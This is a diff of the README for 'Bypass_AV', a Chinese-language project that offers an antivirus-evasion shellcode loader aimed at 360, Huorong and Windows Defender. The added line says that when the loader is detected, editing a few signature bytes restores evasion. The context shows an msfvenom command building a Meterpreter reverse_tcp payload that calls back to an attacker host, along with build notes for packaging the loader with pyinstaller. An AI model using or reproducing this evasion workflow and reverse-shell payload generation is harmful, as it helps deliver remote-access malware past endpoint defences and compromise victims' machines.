@@ -1,5 +1,6 @@
 # Bypass_AV
 Bypass_AV msf免杀，ShellCode免杀加载器 ，免杀shellcode执行程序 ，360&amp;火绒&amp;Window Defender
+代码够简单，估计要不了多久就进特征库了，被杀了再去改几个特征码照样又可以免杀，保持更新。
 
 ## 声明
 
@@ -15,12 +16,6 @@ Windows 10 64位   360&火绒&Window Defender
 
 Windows 7 64位  或以上操作系统应该都没问题（没有测试）
 
-
-编译
-
-Python  3.8.6
-
-pyinstaller 4.7
 
 ## 使用msfvenom
 
@@ -52,6 +47,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 -
 
 
 ## 打包成可执行程序
+编译
+
+Python  3.8.6
+
+pyinstaller 4.7
 
 ```
 pip install pyinstaller 
